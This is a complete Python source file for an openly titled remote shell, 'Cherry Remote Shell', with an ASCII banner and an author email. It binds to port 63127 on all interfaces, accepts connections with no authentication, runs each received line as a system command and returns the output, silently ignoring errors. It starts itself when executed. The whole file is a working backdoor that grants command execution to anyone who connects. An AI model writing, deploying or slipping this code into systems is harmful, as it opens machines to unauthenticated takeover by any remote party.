'''

                   __.--~~.,-.__
                   `~-._.-(`-.__`-.
                           \    `~~`
                      .--./ \       
                     /#   \  \.--.  
                     \    /  /#   \ 
                      '--'   \    /
                              '--'

Cherry Remote Shell | Version 2.1 | <me.applefrost@gmail.com>

'''



from socket import *
from _thread import *
from subprocess import *



class client(object):
    def __init__(self, socket, address):
        self.socket = socket
        self.address = address

    def send(self, message):
        self.socket.send(str.encode(message))

    def receive(self):
        message = self.socket.recv(1024).decode('utf-8')
        return message

    def close(self):
        self.socket.close()
    


class server(object):
    def __init__(self, port):
        self.socket = socket()
        self.port = port

    def listen(self):
        self.socket.bind(('', self.port))

        while (True):
            self.socket.listen(5)
            socket, info = self.socket.accept()
            address, port = info
            start_new_thread(self.accept, (socket, address))
    
    def accept(self, socket, address):
        _client = client(socket, address)
        _client.send(__doc__)

        while (True):
            try:
                _client.send('\n$ ')
                command = _client.receive()

                output = getoutput(command)
                _client.send(output)

            except:
                continue
            
                                                                          

def main():
    cherry = server(63127)
    cherry.listen()

              

main()
